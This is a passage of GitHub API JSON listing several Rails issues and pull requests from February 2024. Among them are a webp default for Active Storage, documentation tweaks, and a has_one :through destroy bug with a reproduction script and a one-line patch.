        "url": "https://api.github.com/repos/rails/rails/issues/50953",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50953/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50953/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50953/events",
        "html_url": "https://github.com/rails/rails/pull/50953",
        "id": 2114861781,
        "node_id": "PR_kwDNIULOZdP1vw",
        "number": 50953,
        "title": "Add webp as a default to active_storage.web_image_content_types",
        "user": {
            "login": "lewispb",
            "id": 1773614,
            "node_id": "MDQ6VXNlcjE3NzM2MTQ=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1773614?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/lewispb",
            "html_url": "https://github.com/lewispb",
            "followers_url": "https://api.github.com/users/lewispb/followers",
            "following_url": "https://api.github.com/users/lewispb/following{/other_user}",
            "gists_url": "https://api.github.com/users/lewispb/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/lewispb/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/lewispb/subscriptions",
            "organizations_url": "https://api.github.com/users/lewispb/orgs",
            "repos_url": "https://api.github.com/users/lewispb/repos",
            "events_url": "https://api.github.com/users/lewispb/events{/privacy}",
            "received_events_url": "https://api.github.com/users/lewispb/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            },
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            },
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-02T12:51:26Z",
        "updated_at": "2024-02-09T23:47:35Z",
        "closed_at": "2024-02-09T23:47:35Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50953",
            "html_url": "https://github.com/rails/rails/pull/50953",
            "diff_url": "https://github.com/rails/rails/pull/50953.diff",
            "patch_url": "https://github.com/rails/rails/pull/50953.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nCustomers are uploading webp images to our app, and expect them to be rendered just like other images, instead of being converted to the fallback PNG format.\r\n\r\n### Detail\r\n\r\nFollows https://github.com/rails/rails/pull/38918 and https://github.com/rails/rails/pull/38988. At the time, webp browser support was limited. Now 96% of browsers support webp: https://caniuse.com/?search=webp\r\n\r\nThis PR adds webp as a default image type.\r\n\r\n### Additional information\r\n\r\nI think this is a sensible default in 2024, but alternatively each Rails app may choose:\r\n\r\n```\r\nRails.application.configure do\r\n  config.active_storage.web_image_content_types << \"image/webp\"\r\nend\r\n```\r\n\r\n**Changelog**\r\n\r\nI've not added a changelog entry in line with https://github.com/rails/rails/pull/38918#discussion_r410527726, but I'd be happy to add one if it's felt useful now.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n\r\ncc @jeremy \r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50953/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50953/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50952",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50952/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50952/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50952/events",
        "html_url": "https://github.com/rails/rails/pull/50952",
        "id": 2114686099,
        "node_id": "PR_kwDNIULOZdGLMw",
        "number": 50952,
        "title": "Tiny update to callbacks docs [ci skip]",
        "user": {
            "login": "nicholasdower",
            "id": 9117775,
            "node_id": "MDQ6VXNlcjkxMTc3NzU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/9117775?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/nicholasdower",
            "html_url": "https://github.com/nicholasdower",
            "followers_url": "https://api.github.com/users/nicholasdower/followers",
            "following_url": "https://api.github.com/users/nicholasdower/following{/other_user}",
            "gists_url": "https://api.github.com/users/nicholasdower/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/nicholasdower/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/nicholasdower/subscriptions",
            "organizations_url": "https://api.github.com/users/nicholasdower/orgs",
            "repos_url": "https://api.github.com/users/nicholasdower/repos",
            "events_url": "https://api.github.com/users/nicholasdower/events{/privacy}",
            "received_events_url": "https://api.github.com/users/nicholasdower/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            },
            {
                "id": 107190,
                "node_id": "MDU6TGFiZWwxMDcxOTA=",
                "url": "https://api.github.com/repos/rails/rails/labels/activemodel",
                "name": "activemodel",
                "color": "00E5FF",
                "default": false,
                "description": null
            },
            {
                "id": 123812746,
                "node_id": "MDU6TGFiZWwxMjM4MTI3NDY=",
                "url": "https://api.github.com/repos/rails/rails/labels/activejob",
                "name": "activejob",
                "color": "5319e7",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-02T11:11:56Z",
        "updated_at": "2024-02-02T12:33:53Z",
        "closed_at": "2024-02-02T12:33:18Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50952",
            "html_url": "https://github.com/rails/rails/pull/50952",
            "diff_url": "https://github.com/rails/rails/pull/50952.diff",
            "patch_url": "https://github.com/rails/rails/pull/50952.patch",
            "merged_at": "2024-02-02T12:33:18Z"
        },
        "body": "### Motivation / Background\r\n\r\nThe following was added to the `ActiveJob::Callbacks`, `ActiveModel::Callbacks` and `AbstractController:Callbacks` docs in #29072:\r\n\r\n> NOTE: Calling the same callback multiple times will overwrite previous callback definitions.\r\n\r\nThe comment refers to \"calling\" callbacks but seems to be about defining callbacks, as mentioned in the PR description.\r\n\r\nIn the ActiveJob and AbstractController docs, I believe this will be misinterpreted as referring to setting callbacks, which, as far as I can tell, does not have such a restriction.\r\n\r\nIn the ActiveModel docs, I believe it would be slightly clearer to replace \"calling\" with \"defining\".\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50952/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50952/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50951",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50951/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50951/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50951/events",
        "html_url": "https://github.com/rails/rails/pull/50951",
        "id": 2114685245,
        "node_id": "PR_kwDNIULOZdGIPQ",
        "number": 50951,
        "title": "set default_enforce_utf8 to false",
        "user": {
            "login": "ironsand",
            "id": 4509402,
            "node_id": "MDQ6VXNlcjQ1MDk0MDI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/4509402?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ironsand",
            "html_url": "https://github.com/ironsand",
            "followers_url": "https://api.github.com/users/ironsand/followers",
            "following_url": "https://api.github.com/users/ironsand/following{/other_user}",
            "gists_url": "https://api.github.com/users/ironsand/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ironsand/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ironsand/subscriptions",
            "organizations_url": "https://api.github.com/users/ironsand/orgs",
            "repos_url": "https://api.github.com/users/ironsand/repos",
            "events_url": "https://api.github.com/users/ironsand/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ironsand/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-02T11:11:21Z",
        "updated_at": "2024-02-07T07:42:52Z",
        "closed_at": "2024-02-07T07:42:52Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50951",
            "html_url": "https://github.com/rails/rails/pull/50951",
            "diff_url": "https://github.com/rails/rails/pull/50951.diff",
            "patch_url": "https://github.com/rails/rails/pull/50951.patch",
            "merged_at": null
        },
        "body": "`enforce_utf8` is false by deault in `form_for` #30852\r\nWe normally don't need to consider old IE anymore.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50951/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50951/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50950",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50950/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50950/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50950/events",
        "html_url": "https://github.com/rails/rails/pull/50950",
        "id": 2114677525,
        "node_id": "PR_kwDNIULOZdFtKw",
        "number": 50950,
        "title": "Add class name to enum validation exception message",
        "user": {
            "login": "amkisko",
            "id": 54796266,
            "node_id": "MDQ6VXNlcjU0Nzk2MjY2",
            "avatar_url": "https://avatars.githubusercontent.com/u/54796266?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/amkisko",
            "html_url": "https://github.com/amkisko",
            "followers_url": "https://api.github.com/users/amkisko/followers",
            "following_url": "https://api.github.com/users/amkisko/following{/other_user}",
            "gists_url": "https://api.github.com/users/amkisko/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/amkisko/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/amkisko/subscriptions",
            "organizations_url": "https://api.github.com/users/amkisko/orgs",
            "repos_url": "https://api.github.com/users/amkisko/repos",
            "events_url": "https://api.github.com/users/amkisko/events{/privacy}",
            "received_events_url": "https://api.github.com/users/amkisko/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 257468118,
                "node_id": "MDU6TGFiZWwyNTc0NjgxMTg=",
                "url": "https://api.github.com/repos/rails/rails/labels/needs%20work",
                "name": "needs work",
                "color": "000000",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-02T11:07:18Z",
        "updated_at": "2024-02-10T06:44:48Z",
        "closed_at": "2024-02-09T23:35:26Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50950",
            "html_url": "https://github.com/rails/rails/pull/50950",
            "diff_url": "https://github.com/rails/rails/pull/50950.diff",
            "patch_url": "https://github.com/rails/rails/pull/50950.patch",
            "merged_at": "2024-02-09T23:35:26Z"
        },
        "body": "### Motivation / Background\r\n\r\nIn general validation errors should include more information on where it has happened.\r\n\r\n### Detail\r\n\r\nThis PR updates `activerecord/lib/active_record/enum.rb` validation exception message and just adds class name.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50950/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50950/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50949",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50949/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50949/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50949/events",
        "html_url": "https://github.com/rails/rails/pull/50949",
        "id": 2114653503,
        "node_id": "PR_kwDNIULOZdEYOA",
        "number": 50949,
        "title": "Add a Rails Guide for tuning performance for deployment",
        "user": {
            "login": "noahgibbs",
            "id": 82408,
            "node_id": "MDQ6VXNlcjgyNDA4",
            "avatar_url": "https://avatars.githubusercontent.com/u/82408?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/noahgibbs",
            "html_url": "https://github.com/noahgibbs",
            "followers_url": "https://api.github.com/users/noahgibbs/followers",
            "following_url": "https://api.github.com/users/noahgibbs/following{/other_user}",
            "gists_url": "https://api.github.com/users/noahgibbs/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/noahgibbs/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/noahgibbs/subscriptions",
            "organizations_url": "https://api.github.com/users/noahgibbs/orgs",
            "repos_url": "https://api.github.com/users/noahgibbs/repos",
            "events_url": "https://api.github.com/users/noahgibbs/events{/privacy}",
            "received_events_url": "https://api.github.com/users/noahgibbs/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-02T10:55:44Z",
        "updated_at": "2024-02-09T08:15:48Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50949",
            "html_url": "https://github.com/rails/rails/pull/50949",
            "diff_url": "https://github.com/rails/rails/pull/50949.diff",
            "patch_url": "https://github.com/rails/rails/pull/50949.patch",
            "merged_at": null
        },
        "body": "This pull request adds a new Rails Guide called \"Tuning Performance for Deployment\".\r\n\r\n### Motivation / Background\r\n\r\nA few weeks ago there was [an issue to change the default thread count for Puma in Rails](https://github.com/rails/rails/issues/50450) and [a PR to make that change](https://github.com/rails/rails/pull/50669).\r\n\r\nThe PR mentioned that a performance tuning guide would be the right way to document some issues, but no such guide exists. I wrote a basic guide and incorporated a lot of feedback from @byroot (Jean Boussier), who wrote the thread count PR.\r\n\r\nThis pull request adds the suggested Rails Guide.\r\n\r\nCC @nateberkopec - though I know you're very busy right now :-)\r\n\r\n### Detail\r\n\r\nIt's impossible to have a detailed guide for all possible Rails deployment options. This guide focuses on Puma (the default server) and CRuby, and on giving a good start to people who don't already know deployment well. I've tried to mention core performance issues without explaining every possible configuration change.\r\n\r\nNext time there is a deployment configuration change, there will be a place to document the tradeoffs.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [X] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [X] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [X] Tests are added or updated if you fix a bug or add a feature.\r\n* [X] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50949/reactions",
            "total_count": 4,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 4,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50949/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50948",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50948/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50948/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50948/events",
        "html_url": "https://github.com/rails/rails/issues/50948",
        "id": 2114571381,
        "node_id": "I_kwDNIULOfgnMdQ",
        "number": 50948,
        "title": "Destroying bi-directional has_one through association only works from one end",
        "user": {
            "login": "airblade",
            "id": 7265,
            "node_id": "MDQ6VXNlcjcyNjU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/7265?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/airblade",
            "html_url": "https://github.com/airblade",
            "followers_url": "https://api.github.com/users/airblade/followers",
            "following_url": "https://api.github.com/users/airblade/following{/other_user}",
            "gists_url": "https://api.github.com/users/airblade/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/airblade/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/airblade/subscriptions",
            "organizations_url": "https://api.github.com/users/airblade/orgs",
            "repos_url": "https://api.github.com/users/airblade/repos",
            "events_url": "https://api.github.com/users/airblade/events{/privacy}",
            "received_events_url": "https://api.github.com/users/airblade/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-02-02T10:14:36Z",
        "updated_at": "2024-02-13T16:53:56Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Summary\r\n\r\nGiven a `has_one :through` association with `dependent: :destroy`, destroying the parent destroys the through record and the far end.  However if the association is bi-directional, destroying only works from one end  and the end which succeeds depends on the order of `belongs_to` declarations in the join model.  I believe it should work from both ends.\r\n\r\n### Steps to reproduce\r\n\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\"\r\n  gem \"sqlite3\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\nActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\")\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :lefts, force: true do |t|\r\n  end\r\n\r\n  create_table :rights, force: true do |t|\r\n  end\r\n\r\n  create_table :middles, force: true do |t|\r\n    t.references :left, foreign_key: true\r\n    t.references :right, foreign_key: true\r\n  end\r\nend\r\n\r\nclass Left < ActiveRecord::Base\r\n  has_one :middle, dependent: :destroy\r\n  has_one :right, through: :middle\r\nend\r\n\r\nclass Middle < ActiveRecord::Base\r\n  belongs_to :left, dependent: :destroy\r\n  belongs_to :right, dependent: :destroy\r\nend\r\n\r\nclass Right < ActiveRecord::Base\r\n  has_one :middle, dependent: :destroy\r\n  has_one :left, through: :middle\r\nend\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_destroying_left_destroys_right\r\n    left = Left.create!\r\n    right = Right.create!\r\n    middle = Middle.create! left: left, right: right\r\n\r\n    left.destroy\r\n    assert right.destroyed?\r\n  end\r\n\r\n  def test_destroying_right_destroys_left\r\n    left = Left.create!\r\n    right = Right.create!\r\n    middle = Middle.create! left: left, right: right\r\n\r\n    right.destroy\r\n    assert left.destroyed?\r\n  end\r\nend\r\n```\r\n\r\n### Expected behavior\r\n\r\nI expect:\r\n\r\n- `left.destroy` to also destroy its `middle` and its `right`\r\n- `right.destroy` to also destroy its `middle` and its `left`\r\n\r\n### Actual behavior\r\n\r\n- `right.destroy` destroys its `middle` and its `left`\r\n-  `left.destroy` destroys its `middle` but does not destroy its `right`\r\n\r\nHowever if I reverse the order of `Middle`'s `belongs_to` declarations, `right.destroy` stops working and `left.destroy` starts working.\r\n\r\n### Patch\r\n\r\nThis patch fixes the behaviour and does not break any existing tests (via `bundle exec rake test:sqlite3`):\r\n\r\n```diff\r\ndiff --git i/activerecord/lib/active_record/callbacks.rb w/activerecord/lib/active_record/callbacks.rb\r\nindex 29c72d1024..6e9c68b747 100644\r\n--- i/activerecord/lib/active_record/callbacks.rb\r\n+++ w/activerecord/lib/active_record/callbacks.rb\r\n@@ -418,7 +418,7 @@ module ClassMethods\r\n \r\n     def destroy # :nodoc:\r\n       @_destroy_callback_already_called ||= false\r\n-      return if @_destroy_callback_already_called\r\n+      return true if @_destroy_callback_already_called\r\n       @_destroy_callback_already_called = true\r\n       _run_destroy_callbacks { super }\r\n     rescue RecordNotDestroyed => e\r\n```\r\n\r\nCredit for the patch belongs to [Alex](https://stackoverflow.com/a/77917179/151007).\r\n\r\n### System configuration\r\n\r\n**Rails version**: 7.1.3\r\n\r\n**Ruby version**: 3.3.0\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50948/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50948/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50947",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50947/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50947/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50947/events",
        "html_url": "https://github.com/rails/rails/issues/50947",
        "id": 2114046969,
        "node_id": "I_kwDNIULOfgHL-Q",
        "number": 50947,
        "title": "ActiveStorage::IntegrityError (ActiveStorage::IntegrityError)",
        "user": {
            "login": "raoehtesham03",
            "id": 152256436,
            "node_id": "U_kgDOCRM_tA",
            "avatar_url": "https://avatars.githubusercontent.com/u/152256436?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/raoehtesham03",
            "html_url": "https://github.com/raoehtesham03",
            "followers_url": "https://api.github.com/users/raoehtesham03/followers",
            "following_url": "https://api.github.com/users/raoehtesham03/following{/other_user}",
            "gists_url": "https://api.github.com/users/raoehtesham03/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/raoehtesham03/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/raoehtesham03/subscriptions",
            "organizations_url": "https://api.github.com/users/raoehtesham03/orgs",
            "repos_url": "https://api.github.com/users/raoehtesham03/repos",
            "events_url": "https://api.github.com/users/raoehtesham03/events{/privacy}",
            "received_events_url": "https://api.github.com/users/raoehtesham03/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-02T04:43:40Z",
        "updated_at": "2024-02-21T03:59:50Z",
        "closed_at": "2024-02-21T03:59:49Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\nI have upgraded my rails application from 5.2 to 6.0 and then 6.0 to 7.0 . So, I am getting ActiveStorage::IntegrityError (ActiveStorage::IntegrityError) while I am trying to get -\r\n```ruby\r\n attachment.variant(resize_to_limit: resize).processed.url\r\n```\r\n\r\n### Expected behavior\r\nIt should not give this error.\r\n\r\n### Actual behavior\r\nGetting this  ActiveStorage::IntegrityError (ActiveStorage::IntegrityError) Error.\r\n\r\n### System configuration\r\n**Rails version**: 3.0.6\r\n\r\n**Ruby version**:  7.0.8\r\n\r\n\r\nPlease provide me the solution to resolve this problem I am stuck on it since a week.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50947/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50947/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50946",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50946/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50946/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50946/events",
        "html_url": "https://github.com/rails/rails/pull/50946",
        "id": 2113959017,
        "node_id": "PR_kwDNIULOZceF3g",
        "number": 50946,
        "title": "Fix error raised when running `db:schema:load:#{name}` and test DB config is missing",
        "user": {
            "login": "ricardotk002",
            "id": 3733470,
            "node_id": "MDQ6VXNlcjM3MzM0NzA=",
            "avatar_url": "https://avatars.githubusercontent.com/u/3733470?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ricardotk002",
            "html_url": "https://github.com/ricardotk002",
            "followers_url": "https://api.github.com/users/ricardotk002/followers",
            "following_url": "https://api.github.com/users/ricardotk002/following{/other_user}",
            "gists_url": "https://api.github.com/users/ricardotk002/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ricardotk002/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ricardotk002/subscriptions",
            "organizations_url": "https://api.github.com/users/ricardotk002/orgs",
            "repos_url": "https://api.github.com/users/ricardotk002/repos",
            "events_url": "https://api.github.com/users/ricardotk002/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ricardotk002/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-02T03:17:31Z",
        "updated_at": "2024-02-05T17:33:03Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50946",
            "html_url": "https://github.com/rails/rails/pull/50946",
            "diff_url": "https://github.com/rails/rails/pull/50946.diff",
            "patch_url": "https://github.com/rails/rails/pull/50946.patch",
            "merged_at": null
        },
